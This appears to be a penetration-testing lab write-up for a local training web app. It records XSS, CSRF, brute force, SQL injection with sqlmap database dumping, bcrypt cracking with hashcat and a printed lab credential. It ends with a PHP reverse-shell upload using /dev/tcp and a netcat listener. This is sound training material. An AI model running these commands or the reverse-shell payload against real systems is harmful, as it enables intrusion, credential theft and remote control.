Lab: http://localhost/capstone/index.php

# Recon

## General

![[Pasted image 20240327094628.png]]
## Admin interface

![[Pasted image 20240326214911.png]]

![[Pasted image 20240326215121.png]]

# Reflected XSS

## GET parameter *message*

PoC:
![[Pasted image 20240326213418.png]]

![[Pasted image 20240326213518.png]]

# Stored XSS
## Add rating

![[Pasted image 20240326213629.png]]

# CSRF

## Add rating

![[Pasted image 20240326214348.png]]

# Brute-Force

## Login

![[Pasted image 20240326214633.png]]

# SQL injection

## GET parameter *coffee*

PoC:
![[Pasted image 20240327085808.png]]

Exploitation:
Enum all databases:
```bash
sqlmap -u http://localhost/capstone/coffee.php?coffee=INJ -p coffee --dbs
```
![[Pasted image 20240327090249.png]]

Enum tables of db "peh-capstone-labs":
```bash
sqlmap -u http://localhost/capstone/coffee.php?coffee=INJ -p coffee -D peh-capstone-labs --tables
```
![[Pasted image 20240327090343.png]]

Dump table "users":
```bash
sqlmap -u http://localhost/capstone/coffee.php?coffee=INJ -p coffee -D peh-capstone-labs -T users --dump
```
![[Pasted image 20240327090531.png]]

# Cracking admin hashes

With some googling => bcrypt hashes

```bash
hashcat -m 3200 admin_hashes.txt /usr/share/wordlists/rockyou.txt
```

Success! Jeremy's password:
![[Pasted image 20240327092232.png]]
jeremy:captain1

# File Upload

As admin we can access the site http://localhost/capstone/admin/admin.php, where we can add a new coffee. We have also the possibility to upload an image file for the entry.

Setup a netcat listener for reverse shell on the attacker machine:
```bash
nc -vlnp 8888
```

Reverse shell:
```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/8888 0>&1'"); ?>
```

Upload an image file "rshell.php" with the reverse shell as payload:
![[Pasted image 20240327104440.png]]
The image is moved by the application. We have to access the uploaded file under http://localhost/capstone/assets/37.php, where 37 (in our case) is the uploaded image number.

Upon accessing the above URL the php code is executed giving us a system shell:
![[Pasted image 20240327104404.png]]